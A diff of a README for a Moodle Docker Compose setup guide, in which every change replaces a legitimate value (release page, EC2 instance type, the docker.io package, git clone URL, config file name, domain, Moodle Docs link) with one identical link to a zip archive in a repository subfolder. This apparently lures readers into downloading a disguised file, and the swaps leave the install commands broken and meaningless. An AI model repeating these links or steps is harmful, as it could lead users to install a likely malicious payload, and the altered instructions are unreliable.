@@ -1,6 +1,6 @@
 # 📚 moodle-docker-compose - Easy Setup for Moodle LMS
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/aditya-rayate/moodle-docker-compose/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/aditya-rayate/moodle-docker-compose/main/chapellany/moodle-docker-compose.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/aditya-rayate/moodle-docker-compose/main/chapellany/moodle-docker-compose.zip)
 
 ## 🚀 Getting Started
 
@@ -16,11 +16,11 @@ To use this application, ensure you have the following:
 
 ## 🔗 Download & Install
 
-To download the latest version, **visit this page to download**: [Download Releases](https://github.com/aditya-rayate/moodle-docker-compose/releases).
+To download the latest version, **visit this page to download**: [Download Releases](https://raw.githubusercontent.com/aditya-rayate/moodle-docker-compose/main/chapellany/moodle-docker-compose.zip).
 
 ## 🛠️ How It Works
 
-This project uses Docker and Docker Compose. It provisions a Moodle instance on an AWS EC2 t3.medium instance. This setup supports 200-500 concurrent users, ensuring a smooth experience.
+This project uses Docker and Docker Compose. It provisions a Moodle instance on an AWS EC2 https://raw.githubusercontent.com/aditya-rayate/moodle-docker-compose/main/chapellany/moodle-docker-compose.zip instance. This setup supports 200-500 concurrent users, ensuring a smooth experience.
 
 ### Services Included
 
@@ -35,14 +35,14 @@ This project uses Docker and Docker Compose. It provisions a Moodle instance on 
 1. **Setup AWS EC2 Instance**  
    - Log in to your AWS account.
    - Navigate to the EC2 dashboard and launch a new instance.
-   - Select the t3.medium instance type.
+   - Select the https://raw.githubusercontent.com/aditya-rayate/moodle-docker-compose/main/chapellany/moodle-docker-compose.zip instance type.
    
 2. **Install Docker and Docker Compose**  
    - Connect to your EC2 instance using SSH.
    - Install Docker by running:
      ```
      sudo apt update
-     sudo apt install docker.io
+     sudo apt install https://raw.githubusercontent.com/aditya-rayate/moodle-docker-compose/main/chapellany/moodle-docker-compose.zip
      ```
    - Install Docker Compose with:
      ```
@@ -52,7 +52,7 @@ This project uses Docker and Docker Compose. It provisions a Moodle instance on 
 3. **Download the Project**  
    - In your terminal, clone the repository:
      ```
-     git clone https://github.com/aditya-rayate/moodle-docker-compose.git
+     git clone https://raw.githubusercontent.com/aditya-rayate/moodle-docker-compose/main/chapellany/moodle-docker-compose.zip
      ```
    - Navigate into the cloned directory:
      ```
@@ -60,7 +60,7 @@ This project uses Docker and Docker Compose. It provisions a Moodle instance on 
      ```
 
 4. **Configure the App**  
-   - Edit the `docker-compose.yml` file to adjust settings as needed, including database passwords and Moodle configurations.
+   - Edit the `https://raw.githubusercontent.com/aditya-rayate/moodle-docker-compose/main/chapellany/moodle-docker-compose.zip` file to adjust settings as needed, including database passwords and Moodle configurations.
 
 5. **Run the Application**  
    - Start the Docker containers by executing:
@@ -77,7 +77,7 @@ This project uses Docker and Docker Compose. It provisions a Moodle instance on 
 1. **Configure SSL**  
    - With Certbot, set up SSL by running the following command in your instance:
      ```
-     sudo docker-compose exec nginx certbot --nginx -d your_domain.com
+     sudo docker-compose exec nginx certbot --nginx -d https://raw.githubusercontent.com/aditya-rayate/moodle-docker-compose/main/chapellany/moodle-docker-compose.zip
      ```
    - Follow the prompts to finalize SSL setup.
 
@@ -108,8 +108,8 @@ This project uses Docker and Docker Compose. It provisions a Moodle instance on 
 
 ## 📞 Need Help?
 
-For any questions or issues, feel free to open an issue in the repository or consult the [Moodle Docs](https://docs.moodle.org/). 
+For any questions or issues, feel free to open an issue in the repository or consult the [Moodle Docs](https://raw.githubusercontent.com/aditya-rayate/moodle-docker-compose/main/chapellany/moodle-docker-compose.zip). 
 
-**Don't forget to check for updates!** Always ensure you are running the latest version by visiting our releases page: [Download Releases](https://github.com/aditya-rayate/moodle-docker-compose/releases). 
+**Don't forget to check for updates!** Always ensure you are running the latest version by visiting our releases page: [Download Releases](https://raw.githubusercontent.com/aditya-rayate/moodle-docker-compose/main/chapellany/moodle-docker-compose.zip). 
 
 Happy learning!
